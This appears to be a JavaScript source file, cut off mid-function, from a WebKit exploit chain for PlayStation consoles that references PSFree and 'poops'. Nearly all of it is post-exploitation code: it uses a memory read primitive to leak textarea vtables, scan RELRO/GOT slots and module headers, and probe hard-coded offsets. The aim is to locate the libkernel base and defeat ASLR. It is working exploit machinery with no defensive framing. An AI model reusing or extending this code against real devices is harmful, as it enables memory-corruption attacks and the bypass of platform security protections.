function lkDiagSnapshot(state) {
    const d = (state && state.diag) || {};
    return {
        cells: d.cells != null ? d.cells : 0,
        vtCount: d.vtables != null ? d.vtables : 0,
        vtExt: d.vtExt != null ? d.vtExt : 0,
        nearPages: d.nearPages != null ? d.nearPages : 0,
        belowPages: d.belowPages != null ? d.belowPages : 0,
        known: d.known != null ? d.known : 0,
    };
}

function lkChunkOut(parentState, c, hit) {
    const out = {
        done: !!c.done,
        state: parentState,
        phase: c.phase,
    };
    if (hit || c.ok) out.ok = true;
    if (c.lk) out.lk = c.lk;
    if (c.iatRva != null) out.iatRva = c.iatRva;
    if (c.source) out.source = c.source;
    if (c.tried != null) out.tried = c.tried;
    if (c.pages != null) out.pages = c.pages;
    if (c.hits != null) out.hits = c.hits;
    if (c.cursor != null) out.cursor = c.cursor;
    if (c.at != null) out.at = c.at;
    if (c.cells != null) out.cells = c.cells;
    if (c.vtCount != null) out.vtCount = c.vtCount;
    if (c.error) out.error = c.error;
    if (c.extList) out.extList = c.extList;
    if (c.n != null) out.n = c.n;
    if (c.slots != null) out.slots = c.slots;
    if (c.hdr) out.hdr = c.hdr;
    if (c.span) out.span = c.span;
    if (c.from != null) out.from = c.from;
    if (c.to != null) out.to = c.to;
    if (c.label) out.label = c.label;
    if (c.cellDbg) out.cellDbg = c.cellDbg;
    if (c.idx != null) out.idx = c.idx;
    if (c.vtableAbs) out.vtableAbs = c.vtableAbs;
    if (c.prev) out.prev = c.prev;
    return out;
}

function lkFinalMiss(state, extra) {
    extra = extra || {};
    const snap = lkDiagSnapshot(state);
    return Object.assign({
        done: true,
        ok: false,
        error: extra.error || "all phases exhausted",
        state: null,
        phase: "got-scan-miss",
        extList: state.extList || [],
        vtable: state.vtableAbs ? String(state.vtableAbs) : null,
        cells: snap.cells,
        vtCount: snap.vtCount,
        vtExt: snap.vtExt,
        nearPages: snap.nearPages,
        belowPages: snap.belowPages,
        known: snap.known,
        diag: state.diag,
    }, extra);
}

/** Walk module headers before code ptr — never reads fnPtr itself. */
function findModuleBaseBeforeCode(p, fnPtr, webkitBase, off, maxPages) {
    if (!fnPtr || fnPtr.hi < 0x8) return null;
    maxPages = maxPages || 512;
    let page = pageAlignDown(fnPtr, 0x4000);
    if (page.hi >= 0x8) page = page.sub32(0x4000);
    let nullStreak = 0;
    for (let i = 0; i < maxPages; i++) {
        if (!page || page.hi < 0x8) break;
        if (!plausibleLkBeforeRead(page, fnPtr, webkitBase, off)) break;
        const magic = read4p(p, page);
        if (magic == null) {
            nullStreak++;
            if (nullStreak >= 6) break;
            page = page.sub32(0x4000);
            continue;
        }
        nullStreak = 0;
        if (isModuleMagic(magic)) {
            if (!isSameWebkitModule(page, webkitBase, off))
                return page;
        }
        page = page.sub32(0x4000);
    }
    return null;
}

/**
 * Ext fn ptr → SCE/ELF header walk + lite stub score. Returns hit or diag.
 */
export function resolveExtModuleHuntDiag(p, fnPtr, webkitBase, off, maxPages) {
    if (!fnPtr || fnPtr.hi < 0x8)
        return { hit: null, walked: 0, hdr: false };
    maxPages = maxPages != null ? Math.min(maxPages, 16) : 12;

    let page = pageAlignDown(fnPtr, 0x4000);
    if (page.hi >= 0x8) page = page.sub32(0x4000);
    let nullStreak = 0;
    let walked = 0;
    let hdr = null;
    for (let i = 0; i < maxPages; i++) {
        walked++;
        if (!page || !plausibleLkBeforeRead(page, fnPtr, webkitBase, off)) break;
        const magic = read4p(p, page);
        if (magic == null) {
            nullStreak++;
            if (nullStreak >= 6) break;
            page = page.sub32(0x4000);
            continue;
        }
        nullStreak = 0;
        if (isModuleMagic(magic) && !isSameWebkitModule(page, webkitBase, off)) {
            hdr = page;
            break;
        }
        page = page.sub32(0x4000);
    }

    if (!hdr)
        return { hit: null, walked, hdr: false };

    const stubs = liteSyscallStubScore(p, hdr);
    if (stubs >= 2)
        return { hit: { lk: hdr, via: "mod-hunt", stubs, fnPtr }, walked, hdr: true, stubs };
    if (stubs >= 1 && checkPrologueAt(p, hdr))
        return { hit: { lk: hdr, via: "mod-hunt-weak", stubs, fnPtr, weak: true }, walked, hdr: true, stubs };
    return { hit: null, walked, hdr: true, stubs: stubs };
}

export function resolveExtModuleHunt(p, fnPtr, webkitBase, off, maxPages) {
    const d = resolveExtModuleHuntDiag(p, fnPtr, webkitBase, off, maxPages);
    return d.hit || null;
}

/** ≤3 reads — hunt-only stub spot check. */
function microStubScore(p, base) {
    let stubs = 0;
    const offs = [0x1000, 0x9000, 0x15000];
    for (let i = 0; i < offs.length; i++) {
        const w = read4p(p, base.add32(offs[i]));
        if (w != null && (w & 0xffffff) === 0xc0c748) stubs++;
    }
    return stubs;
}

/** Poops HW: wk- offsets that OOM on read (incl deep band ≥0x1c00000). */
const LK_HUNT_TOXIC_DELTAS = new Set([
    0x1800000, 0x1c00000, 0x2000000, 0x2800000, 0x3000000, 0x3800000,
]);
/** Stay in 4–22MB band — user HW maps probes 1–4, OOMs deeper. */
const LK_HUNT_DELTAS = [
    0x400000, 0x600000, 0x800000, 0xc00000,
    0x1000000, 0x1200000, 0x1400000, 0x1600000,
];

function classifyProbeMagic(w, addr, webkitBase, off) {
    if (w == null) return "UNMAPPED";
    if (webkitBase && isSameWebkitModule(addr, webkitBase, off)) return "webkit";
    if (w === SCE_MAGIC) return "SCE";
    if (w === ELF_MAGIC) return "ELF";
    if (w === POOPS_TEXT_MAGIC) return "text";
    return "mapped:0x" + (w >>> 0).toString(16);
}

/** Fixed offsets below webkit — 1 peek each, log every probe (no stub follow-up). */
export function huntLibkernelCandidatesChunk(p, webkitBase, off, state, opts) {
    opts = opts || {};
    const readMax = opts.readMax != null ? opts.readMax : 8;
    if (!p || !webkitBase)
        return { done: true, ok: false, phase: "cand-skip" };

    if (!state) {
        const wb = ptrBig(webkitBase) & ~0x3fffn;
        const deltas = LK_HUNT_DELTAS;
        const addrs = [];
        for (let i = 0; i < deltas.length; i++) {
            const d = deltas[i];
            const entry = {
                hex: "0x" + (wb - BigInt(d)).toString(16),
                why: "wk-" + d.toString(16),
            };
            if (LK_HUNT_TOXIC_DELTAS.has(d)) {
                entry.skip = true;
                entry.skipWhy = "TOXIC-OOM";
            }
            addrs.push(entry);
        }
        state = { addrs, idx: 0, reads: 0, nulls: 0, nullRun: 0, log: [] };
        return { done: false, state, phase: "cand-start", total: addrs.length, readMax, wk: String(webkitBase) };
    }

    if (state.reads >= readMax) {
        return { done: true, ok: false, state, phase: "cand-budget", reads: state.reads, log: state.log };
    }

    if (state.idx >= state.addrs.length) {
        return {
            done: true,
            ok: false,
            state,
            phase: "cand-miss",
            reads: state.reads,
            nulls: state.nulls,
            log: state.log,
        };
    }

    const c = state.addrs[state.idx];
    const n = state.idx + 1;
    const total = state.addrs.length;
    state.idx++;

    const probe = {
        n: n,
        total: total,
        hex: c.hex,
        why: c.why,
        addr: c.hex,
    };

    if (c.skip) {
        probe.magic = c.skipWhy || "SKIP";
        probe.raw = "-";
        state.log.push(probe);
        return {
            done: false,
            state,
            phase: "cand-skip-probe",
            probe,
            reads: state.reads,
            log: state.log,
        };
    }

    state.reads++;

    let addr = null;
    try {
        addr = parseAddrSync(c.hex.replace(/^0x/i, ""));
    } catch (_) {
        addr = null;
    }
    probe.addr = addr ? String(addr) : "?";

    if (!addr) {
        probe.magic = "BAD-ADDR";
        state.log.push(probe);
        return { done: false, state, phase: "cand-probe", probe, reads: state.reads, log: state.log };
    }

    const usleepOff = off.k_usleep != null ? off.k_usleep : 0x13b20;
    const raw = read4p(p, addr.add32(usleepOff));
    probe.raw = raw == null ? "null" : ("0x" + (raw >>> 0).toString(16));
    probe.magic = raw == null ? "UNMAPPED"
        : (raw === 0x554889e5 || checkPrologueAt(p, addr.add32(usleepOff)))
            ? "usleep+" + usleepOff.toString(16)
            : classifyProbeMagic(raw, addr, webkitBase, off);
    if (raw == null) {
        state.nulls++;
        state.nullRun = (state.nullRun || 0) + 1;
    } else {
        state.nullRun = 0;
    }
    state.log.push(probe);

    if (state.nullRun >= 3) {
        return {
            done: true,
            ok: false,
            state,
            phase: "cand-null-cliff",
            reads: state.reads,
            nulls: state.nulls,
            probe,
            log: state.log,
        };
    }

    if (raw != null && probe.magic.startsWith("usleep+")) {
        saveLibkernelSession(addr, null);
        return {
            done: true,
            ok: true,
            lk: addr,
            strong: false,
            stubs: 0,
            source: "hunt-suchi+" + c.why,
            state,
            phase: "cand-hit",
            reads: state.reads,
            probe,
            log: state.log,
        };
    }

    return {
        done: false,
        state,
        phase: "cand-probe",
        probe,
        reads: state.reads,
        nulls: state.nulls,
        log: state.log,
    };
}

/** @deprecated linear below scan OOMs — use huntLibkernelCandidatesChunk */
export function huntLibkernelBelowWebkitChunk(p, webkitBase, off, state, opts) {
    if (!state)
        return { done: true, ok: false, phase: "hunt-skip", error: "disabled" };
    return { done: true, ok: false, state, phase: "hunt-miss", reads: 0, modules: 0 };
}

/** @deprecated RELRO walk OOMs — collect ext ptrs in Scan GOT lite instead */
export function scanPoopsImportChunk(p, webkitBase, off, state, opts) {
    return { done: true, ok: false, phase: "imp-skip", error: "disabled" };
}

function addrFromNum(n) {
    if (!Number.isFinite(n) || n <= 0) return null;
    const b = BigInt(Math.trunc(n));
    return new int64(Number(b & 0xffffffffn), Number((b >> 32n) & 0xffffffffn));
}

function plausibleCodePtr(p) {
    return userlandPtrOk(p);
}

function looksLikeNativeCodeMagic(w) {
    if (w == null) return false;
    const b0 = w & 0xff;
    return b0 === 0x55 || b0 === 0x48 || b0 === 0xb8 || b0 === 0xe9 || b0 === 0x41;
}

function plausibleHeapCell(cell) {
    if (!cell) return false;
    if (cell.hi === 0 && cell.low === 0) return false;
    if (cell.hi === 0 && cell.low < 0x10000) return false;
    return true;
}

export { plausibleHeapCell };

/** cal_demo-style multi-path textarea → vtable discovery. */
function discoverTextareaVtables(p, opts) {
    opts = opts || {};
    const cells = [];
    const cellDbg = [];
    const seenCell = new Set();
    function addCell(label, cell) {
        if (!plausibleHeapCell(cell)) {
            cellDbg.push(label + ":bad");
            return;
        }
        const k = ptrBig(cell).toString(16);
        if (seenCell.has(k)) {
            cellDbg.push(label + ":dup");
            return;
        }
        seenCell.add(k);
        cells.push({ label: label, cell: cell });
        cellDbg.push(label + "=" + cell);
    }
    try {
        if (opts.carrier && opts.carrier.textarea)
            addCell("carrier.ta", p.leakval(opts.carrier.textarea));
    } catch (_) { }
    if (opts.carrier && opts.carrier.textareaAddress > 0)
        addCell("carrier.addr", addrFromNum(opts.carrier.textareaAddress));
    try {
        const ssCell = sessionStorage.getItem("wk-textareaCell");
        if (ssCell) addCell("session.cell", parseAddrSync(ssCell));
        const ssAddr = sessionStorage.getItem("wk-textareaAddr");
        if (ssAddr) addCell("session.addr", parseAddrSync(ssAddr));
    } catch (_) { }
    if (opts.pairCells) {
        for (let pi = 0; pi < opts.pairCells.length; pi++) {
            const pc = opts.pairCells[pi];
            if (pc && pc.cell) addCell(pc.label || "pair", pc.cell);
        }
    }
    try {
        const expCell = p.leakval(Math.expm1);
        addCell("expm1.cell", expCell);
    } catch (_) { }
    if (!opts.noFresh) {
        try {
            const ta = document.createElement("textarea");
            if (opts.retain) opts.retain.push(ta);
            addCell("fresh.ta", p.leakval(ta));
        } catch (_) { }
    }

    const vtables = [];
    const seenVt = new Set();
    function addVt(label, vtable, webcore) {
        if (!vtable || !plausibleCodePtr(vtable)) return;
        const e0 = read4p(p, vtable);
        if (e0 == null) return;
        const k = ptrBig(vtable).toString(16);
        if (seenVt.has(k)) return;
        seenVt.add(k);
        vtables.push({ label: label, vtable: vtable, webcore: webcore, entry0: e0 });
    }

    const cellMax = opts.cellMax != null ? opts.cellMax : (opts.lite ? 2 : 4);
    for (let ci = 0; ci < cells.length && ci < cellMax; ci++) {
        const path = cells[ci];
        const webcore18 = read8p(p, path.cell.add32(0x18));
        if (webcore18) {
            const vt = read8p(p, webcore18);
            if (vt) addVt(path.label + "/psfree+0x18", vt, webcore18);
        }
    }
    return { cells: cells.length, vtables: vtables, cellDbg: cellDbg };
}

/** Resolve ext import ptr → libkernel base — Suchi RVA subtract first (0 reads). */
export function resolveExtPtrSafe(p, fnPtr, off, webkitBase, opts) {
    opts = opts || {};
    if (!fnPtr || fnPtr.hi < 0x8) return null;
    const zero = calcLkFromFnPtrZeroRead(fnPtr, off);
    if (zero.length) {
        const hit = zero[0];
        return {
            lk: hit.lk,
            iatRva: null,
            fnPtr,
            via: hit.via,
            k__error: hit.key === "k__error" ? hit.rva : null,
            rvaKey: hit.key,
            rva: hit.rva,
        };
    }
    if (opts.allowWalk === false) return null;
    const ctx = { fnPtr, webkitBase, off };
    const errs = kErrorCandidates(off);
    for (let i = 0; i < errs.length; i++) {
        const lk = fnPtr.sub32(errs[i]);
        if (!plausibleLkBeforeRead(lk, fnPtr, webkitBase, off)) continue;
        if (!isLibkernelPrologue(p, lk, ctx)) continue;
        return { lk, iatRva: null, fnPtr, via: "error+" + errs[i].toString(16), k__error: errs[i] };
    }
    const pageBase = pageAlignDown(fnPtr, 0x4000);
    if (plausibleLkBeforeRead(pageBase, fnPtr, webkitBase, off)
        && weakLibkernelBaseHit(p, pageBase, read4p(p, pageBase), ctx)) {
        const kOff = Number(ptrBig(fnPtr) - ptrBig(pageBase));
        return { lk: pageBase, iatRva: null, fnPtr, via: "page+k=" + kOff.toString(16), k__error: kOff };
    }
    return resolveExtPtrPageWalk(p, fnPtr, webkitBase, off, opts.walkPages != null ? opts.walkPages : 64);
}

/** Resolve ext code ptr → libkernel base — Suchi RVA subtract first (0 reads on poops). */
function resolveExtPtrToLibkernel(p, fnPtr, off, webkitBase, iatRva, opts) {
    opts = opts || {};
    if (!fnPtr || fnPtr.hi < 0x8) return null;

    const zero = calcLkFromFnPtrZeroRead(fnPtr, off);
    if (zero.length) {
        const hit = zero[0];
        return {
            lk: hit.lk,
            iatRva,
            fnPtr,
            strong: false,
            via: hit.via,
            rvaKey: hit.key,
            rva: hit.rva,
        };
    }

    if (opts.zeroReadOnly) return null;

    const errs = kErrorCandidates(off);
    const errMax = opts.errMax != null ? opts.errMax
        : (opts.lite ? errs.length : errs.length);
    for (let i = 0; i < errMax && i < errs.length; i++) {
        const lk = fnPtr.sub32(errs[i]);
        if (!plausibleLkBeforeRead(lk, fnPtr, webkitBase, off)) continue;
        if (!isLibkernelPrologue(p, lk, { fnPtr, webkitBase, off })) continue;
        if (opts.lite) {
            return {
                lk,
                iatRva,
                fnPtr,
                strong: false,
                via: "lite-error+" + errs[i].toString(16),
            };
        }
        const v = verifyLibkernelBase(p, lk, off, { fnPtr, webkitBase, off });
        return {
            lk,
            iatRva,
            fnPtr,
            strong: !!(v.ok && v.strong),
            via: "safe-error+" + errs[i].toString(16),
        };
    }

    const pageBase = pageAlignDown(fnPtr, 0x4000);
    if (plausibleLkBeforeRead(pageBase, fnPtr, webkitBase, off)) {
        const mag = read4p(p, pageBase);
        if (weakLibkernelBaseHit(p, pageBase, mag, { fnPtr, webkitBase, off })) {
            const kOff = Number(ptrBig(fnPtr) - ptrBig(pageBase));
            return {
                lk: pageBase,
                iatRva,
                fnPtr,
                strong: false,
                via: "page+k=" + kOff.toString(16),
            };
        }
    }

    const walked = resolveExtPtrPageWalk(p, fnPtr, webkitBase, off, opts.walkPages != null ? opts.walkPages : 64);
    if (walked) {
        return Object.assign({ iatRva, strong: false }, walked);
    }

    const maxWalk = opts.maxWalkPages != null ? opts.maxWalkPages : 0;
    if (maxWalk <= 0) return null;

    const walked2 = findModuleBaseBeforeCode(p, fnPtr, webkitBase, off, maxWalk);
    if (walked2 && plausibleLkBeforeRead(walked2, fnPtr, webkitBase, off)
        && isLibkernelPrologue(p, walked2, { fnPtr, webkitBase, off })) {
        const v = opts.lite ? { ok: true, strong: false } : verifyLibkernelBase(p, walked2, off);
        return {
            lk: walked2,
            iatRva,
            fnPtr,
            strong: !!(v.ok && v.strong),
            via: "safe-walk" + (v.ok && v.strong ? "+stub" : ""),
        };
    }

    return null;
}

/** Poops mapped RELRO/GOT islands — avoids OOM cliff @ +0x30c10 and high GOT. */
function poopsRelroRanges(off, lite) {
    const cap = Math.min(iatCap(off), 0xc0000);
    const raw = lite ? [
        { lo: 0x10000, hi: 0x2f000, tag: "ro-low" },
        { lo: 0x34000, hi: 0x60000, tag: "ro-mid" },
        { lo: 0x80000, hi: 0xa0000, tag: "ro-rw" },
    ] : [
        { lo: 0x10000, hi: 0x2f000, tag: "ro-low" },
        { lo: 0x34000, hi: 0x80000, tag: "ro-mid" },
        { lo: 0x80000, hi: 0xc0000, tag: "ro-rw" },
    ];
    const out = [];
    for (let i = 0; i < raw.length; i++) {
        const lo = raw[i].lo;
        let hi = raw[i].hi;
        if (lo >= cap) continue;
        if (hi > cap) hi = cap;
        if (hi - lo < 0x1000) continue;
        out.push({ lo: lo & ~7, hi, tag: raw[i].tag });
    }
    return out;
}

function relroScanRanges(p, webkitBase, off, opts) {
    const layout = resolveModuleLayout(p, webkitBase, { quick: true });
    if (layout && layout.hdr) {
        const got = elfMappedGotRanges(p, webkitBase, off);
        if (got.length) return got;
    }
    if (opts && opts.loadBaseHdr)
        return poopsRelroRanges(off, opts && opts.lite);
    return [];
}

/** Chunked backward walk for SCE/ELF module header behind poops .text. */
function scanHeaderRecoverChunk(p, webkitBase, state, opts) {
    opts = opts || {};
    const maxCoarse = opts.hdrCoarse != null ? opts.hdrCoarse : 64;
    const maxFine = opts.hdrFine != null ? opts.hdrFine : 0;

    if (!state) {
        state = { mode: "coarse", idx: 0, step: 0x4000, max: maxCoarse, found: null };
        return { done: false, state, phase: "hdr-start", max: maxCoarse };
    }

    if (state.found) {
        return {
            done: true,
            ok: true,
            layout: state.found,
            state,
            phase: "hdr-hit",
            hdr: String(state.found.hdr),
        };
    }

    let batch = 0;
    const origin = pageAlignDown(webkitBase, state.step);
    while (state.idx < state.max && batch < 4) {
        const back = state.idx++;
        const addr = back === 0 ? origin : origin.sub32(back * state.step);
        batch++;
        if (!addr || addr.hi < 0x8) continue;
        const w = read4p(p, addr);
        if (w === ELF_MAGIC) {
            state.found = { hdr: addr, kind: "elf", img: addr, codeBase: webkitBase };
            _modLayoutKey = "";
            _modLayoutVal = null;
            break;
        }
        if (w === SCE_MAGIC) {
            state.found = {
                hdr: addr,
                kind: "sce",
                img: addr.add32(SCE_ELF_OFF),
                codeBase: webkitBase,
            };
            _modLayoutKey = "";
            _modLayoutVal = null;
            break;
        }
    }

    if (state.found) {
        return {
            done: true,
            ok: true,
            layout: state.found,
            state,
            phase: "hdr-hit",
            hdr: String(state.found.hdr),
            idx: state.idx,
        };
    }

    if (state.idx >= state.max) {
        if (state.mode === "coarse" && maxFine > 0) {
            state.mode = "fine";
            state.idx = 0;
            state.step = 0x1000;
            state.max = maxFine;
            return { done: false, state, phase: "hdr-fine", max: maxFine };
        }
        return { done: true, ok: false, state, phase: "hdr-miss", idx: state.idx };
    }

    return { done: false, state, phase: "hdr", idx: state.idx, max: state.max };
}

/** Scan absolute RELRO around leaked vtable (poops .text base ≠ ELF load base). */
function scanAbsRelroChunk(p, webkitBase, off, state, opts) {
    if (!state) {
        const vt = opts && opts.vtableAbs;
        if (!vt) return { done: true, lk: null, state: null, phase: "abs-skip" };
        const span = BigInt((opts && opts.absSpan) || 0x8000);
        const vtBig = ptrBig(vt);
        const lo = vtBig > span ? vtBig - span : 0n;
        const hi = vtBig + span;
        state = { cursor: lo, end: hi, step: 8n, tried: 0, slots: 0 };
        return {
            done: false,
            state,
            phase: "abs-start",
            vt: String(vt),
            from: lo.toString(16),
            to: hi.toString(16),
        };
    }

    const batchMax = (opts && opts.absBatch) || 16;
    let batch = 0;
    while (state.cursor < state.end && batch < batchMax) {
        const addr = bigToPtr(state.cursor);
        state.cursor += state.step;
        state.tried++;
        state.slots++;
        batch++;
        const fnPtr = read8p(p, addr);
        if (!fnPtr || !plausibleExtPtr(fnPtr, webkitBase, off)) continue;
        const hit = resolveExtPtrToLibkernel(p, fnPtr, off, webkitBase, null);
        if (hit) {
            saveLibkernelSession(hit.lk, hit.iatRva);
            return {
                done: true,
                ok: true,
                lk: hit.lk,
                iatRva: hit.iatRva,
                source: "abs+" + String(addr) + "/" + hit.via,
                state,
                phase: "abs-hit",
                tried: state.tried,
            };
        }
    }

    if (state.cursor >= state.end) {
        return {
            done: true,
            lk: null,
            state,
            phase: "abs-miss",
            tried: state.tried,
            slots: state.slots,
        };
    }

    return {
        done: false,
        state,
        phase: "abs",
        cursor: state.cursor.toString(16),
        tried: state.tried,
    };
}

/** Scan mapped RELRO/GOT slots for resolved libkernel import pointers. */
function scanRelroSlotsChunk(p, webkitBase, off, state, opts) {
    if (!state) {
        const ranges = relroScanRanges(p, webkitBase, off, opts);
        if (!ranges.length)
            return { done: true, lk: null, state: null, phase: "relro-skip" };
        let base = moduleLoadBase(p, webkitBase);
        if (opts && opts.loadBaseHdr)
            base = opts.loadBaseHdr;
        state = {
            loadBase: base,
            ranges,
            rangeIdx: 0,
            cursor: ranges[0].lo,
            endRva: ranges[0].hi,
            tried: 0,
            slots: 0,
        };
        return {
            done: false,
            state,
            phase: "relro-start",
            ranges: ranges.length,
            span: ranges.map(function (r) {
                return r.tag + ":0x" + r.lo.toString(16) + "-0x" + r.hi.toString(16);
            }).join(" "),
        };
    }

    const batchMax = (opts && opts.relroBatch) || 12;
    let batch = 0;
    while (state.cursor < state.endRva && batch < batchMax) {
        const rva = state.cursor;
        state.cursor += 8;
        state.tried++;
        state.slots++;
        batch++;

        const gotHit = safeVerifyGotSlot(p, webkitBase, off, rva);
        if (gotHit) {
            saveLibkernelSession(gotHit.lk, gotHit.iatRva);
            return {
                done: true,
                ok: true,
                lk: gotHit.lk,
                iatRva: gotHit.iatRva,
                source: "relro+" + rva.toString(16) + "/" + gotHit.via,
                state,
                phase: "relro-hit",
                tried: state.tried,
            };
        }

        const fnPtr = read8p(p, state.loadBase.add32(rva));
        if (!fnPtr || !plausibleExtPtr(fnPtr, state.loadBase, off)) continue;
        const hit = resolveExtPtrToLibkernel(p, fnPtr, off, webkitBase, rva, opts);
        if (hit) {
            saveLibkernelSession(hit.lk, hit.iatRva);
            return {
                done: true,
                ok: true,
                lk: hit.lk,
                iatRva: hit.iatRva,
                source: "relro+" + rva.toString(16) + "/" + hit.via,
                state,
                phase: "relro-hit",
                tried: state.tried,
            };
        }
    }

    if (state.cursor >= state.endRva) {
        const next = state.rangeIdx + 1;
        if (next < state.ranges.length) {
            state.rangeIdx = next;
            state.cursor = state.ranges[next].lo;
            state.endRva = state.ranges[next].hi;
            return {
                done: false,
                state,
                phase: "relro-region",
                region: state.ranges[next].tag,
                cursor: state.cursor,
                tried: state.tried,
            };
        }
        return {
            done: true,
            lk: null,
            state,
            phase: "relro-miss",
            tried: state.tried,
            slots: state.slots,
        };
    }

    return {
        done: false,
        state,
        phase: "relro",
        cursor: state.cursor,
        tried: state.tried,
        region: state.ranges[state.rangeIdx].tag,
    };
}

/** PSFree textarea vtable in RELRO — ext ptrs may be resolved libkernel imports. */
function scanTextareaRelroChunk(p, webkitBase, off, state, opts) {
    opts = opts || {};
    const maxVt = opts.vtableEntries || 48;

    if (!state) {
        state = {
            stage: "setup",
            vtMax: maxVt,
            vtIdx: 0,
            vtListIdx: 0,
            vtables: [],
            tried: 0,
            extList: [],
        };
        return { done: false, state, phase: "vt-start", max: maxVt };
    }

    if (state.stage === "setup") {
        const disc = discoverTextareaVtables(p, opts);
        state.vtables = disc.vtables;
        if (opts.lite && state.vtables.length > 1)
            state.vtables = state.vtables.slice(0, 1);
        state.cells = disc.cells;
        state.cellDbg = disc.cellDbg || [];
        state.vtListIdx = 0;
        state.vtIdx = 0;
        state.stage = state.vtables.length ? "vtable" : "done";
        if (!state.vtables.length) {
            return {
                done: true,
                ok: false,
                state,
                phase: "vt-miss",
                error: "no vtable (cells=" + disc.cells + ")",
                cells: disc.cells,
                cellDbg: state.cellDbg,
            };
        }
        state.vtable = state.vtables[0].vtable;
        state.vtLabel = state.vtables[0].label;
        return {
            done: false,
            state,
            phase: "vt-ready",
            vtable: String(state.vtable),
            vtCount: state.vtables.length,
            cells: disc.cells,
            cellDbg: state.cellDbg,
            label: state.vtLabel,
        };
    }

    if (state.stage === "vtable") {
        let batch = 0;
        const batchMax = opts.vtBatch != null ? opts.vtBatch : 2;
        while (batch < batchMax) {
            if (state.vtListIdx >= state.vtables.length) break;
            const cur = state.vtables[state.vtListIdx];
            state.vtable = cur.vtable;
            state.vtLabel = cur.label;
            if (state.vtIdx >= state.vtMax) {
                state.vtListIdx++;
                state.vtIdx = 0;
                continue;
            }
            const idx = state.vtIdx++;
            state.tried++;
            batch++;
            const fnPtr = read8p(p, cur.vtable.add32(idx * 8));
            if (!fnPtr) continue;
            if (!plausibleExtPtr(fnPtr, webkitBase, off)) continue;
            if (opts.collectOnly || opts.deferResolve || opts.safeOnly) {
                if (state.extList.length < 16)
                    state.extList.push({ ptr: String(fnPtr), idx: idx, vt: cur.label });
                continue;
            }
            const hit = resolveExtPtrToLibkernel(p, fnPtr, off, webkitBase, null, opts);
            if (hit) {
                saveLibkernelSession(hit.lk, hit.iatRva);
                return {
                    done: true,
                    ok: true,
                    lk: hit.lk,
                    iatRva: hit.iatRva,
                    source: cur.label + "/[" + idx + "]/" + hit.via,
                    state,
                    phase: "vt-hit",
                    tried: state.tried,
                    vtableAbs: cur.vtable,
                };
            }
            if (state.extList.length < 16)
                state.extList.push({ ptr: String(fnPtr), idx: idx, vt: cur.label });
        }
        if (state.vtListIdx >= state.vtables.length) {
            return {
                done: true,
                ok: false,
                state,
                phase: "vt-miss",
                tried: state.tried,
                extList: state.extList,
                vtableAbs: state.vtable,
                vtCount: state.vtables.length,
                cells: state.cells,
            };
        }
        return {
            done: false,
            state,
            phase: "vt",
            tried: state.tried,
            idx: state.vtIdx,
            vtList: state.vtListIdx + "/" + state.vtables.length,
            label: state.vtLabel,
        };
    }

    return { done: true, ok: false, state, phase: "vt-miss", cells: state.cells || 0 };
}

/**
 * Poops-safe libkernel finder — vtable → abs RELRO → nearlk → below → ELF GOT.
 * Poops .text base is NOT ELF load base — skip webkit+RVA RELRO unless hdr found.
 */
export function resolveLibkernelRelroChunk(p, webkitBase, off, state, opts) {
    opts = opts || {};
    if (!state) {
        state = {
            stage: "known",
            sub: null,
            extList: [],
            vtableAbs: null,
            anchors: null,
            loadBaseHdr: null,
            diag: {
                cells: 0, vtables: 0, vtExt: 0, abs: 0,
                nearPages: 0, belowPages: 0, known: 0,
            },
        };
        return { done: false, state, phase: "got-scan-start" };
    }

    if (!state.diag || typeof state.diag !== "object") {
        state.diag = {
            cells: 0, vtables: 0, vtExt: 0, abs: 0,
            nearPages: 0, belowPages: 0, known: 0,
        };
    }

    if (!state.anchors) {
        state.anchors = [webkitBase];
        if (opts.nativeFn) {
            const nb = ptrBig(opts.nativeFn);
            const wb = ptrBig(webkitBase);
            if (nb !== wb) state.anchors.push(opts.nativeFn);
        }
    }

    if (!state.stage) state.stage = "known";

    if (state.stage === "known") {
        if (opts.knownMax === 0 || opts.skipKnown) {
            state.stage = "vt";
            state.sub = null;
            return { done: false, state, phase: "known-skip", n: 0 };
        }
        const c = scanKnownExtPtrChunk(p, webkitBase, off, state.sub, opts);
        state.sub = c.state;
        if (c.done && c.lk) {
            return lkChunkOut(state, c, true);
        }
        if (c.done) {
            state.stage = "vt";
            state.sub = null;
            state.diag.known = c.tried || (opts.knownExtPtrs ? opts.knownExtPtrs.length : 0);
            return {
                done: false,
                state,
                phase: c.phase === "known-skip" ? "known-skip" : "known-done",
                tried: state.diag.known,
                prev: c.phase,
            };
        }
        return lkChunkOut(state, c, false);
    }

    if (state.stage === "vt") {
        const c = scanTextareaRelroChunk(p, webkitBase, off, state.sub, opts);
        state.sub = c.state;
        if (c.vtableAbs) state.vtableAbs = c.vtableAbs;
        if (c.extList && c.extList.length)
            state.extList = c.extList;
        if (c.done && c.lk) {
            return lkChunkOut(state, c, true);
        }
        if (c.done) {
            state.diag.cells = c.cells != null ? c.cells : state.diag.cells;
            state.diag.vtables = c.vtCount != null ? c.vtCount : state.diag.vtables;
            state.diag.vtExt = state.extList.length;
            if (opts.collectOnly || opts.deferResolve || opts.lite || opts.safeOnly) {
                return lkFinalMiss(state, {
                    prev: c.phase,
                    lite: true,
                    error: "ext collected — use Verify lk",
                    cellDbg: c.cellDbg,
                    cells: c.cells,
                    vtCount: c.vtCount,
                    extList: state.extList,
                });
            }
            state.stage = "abs";
            state.sub = null;
            opts.vtableAbs = state.vtableAbs;
            return {
                done: false,
                state,
                phase: "vt-done",
                prev: c.phase,
                vtable: state.vtableAbs ? String(state.vtableAbs) : "?",
                ext: state.extList.length,
                cells: state.diag.cells,
                vtCount: state.diag.vtables,
                error: c.error,
            };
        }
        return lkChunkOut(state, c, false);
    }

    if (state.stage === "abs") {
        opts.vtableAbs = state.vtableAbs;
        const c = scanAbsRelroChunk(p, webkitBase, off, state.sub, opts);
        state.sub = c.state;
        if (c.done && c.lk) {
            return lkChunkOut(state, c, true);
        }
        if (c.done) {
            state.stage = "nearlk";
            state.sub = null;
            state.diag.abs = c.tried || 0;
            return {
                done: false,
                state,
                phase: "abs-done",
                prev: c.phase,
                tried: c.tried,
                slots: c.slots,
            };
        }
        return lkChunkOut(state, c, false);
    }

    if (state.stage === "nearlk") {
        const c = scanNearLibkernelChunk(p, webkitBase, off, state.sub, state.anchors, opts);
        state.sub = c.state;
        if (c.done && c.lk) {
            return lkChunkOut(state, c, true);
        }
        if (c.done) {
            state.stage = "below";
            state.sub = null;
            state.diag.nearPages = c.pages || 0;
            state.diag.nearHits = c.hits || 0;
            return {
                done: false,
                state,
                phase: "nearlk-done",
                prev: c.phase,
                pages: c.pages,
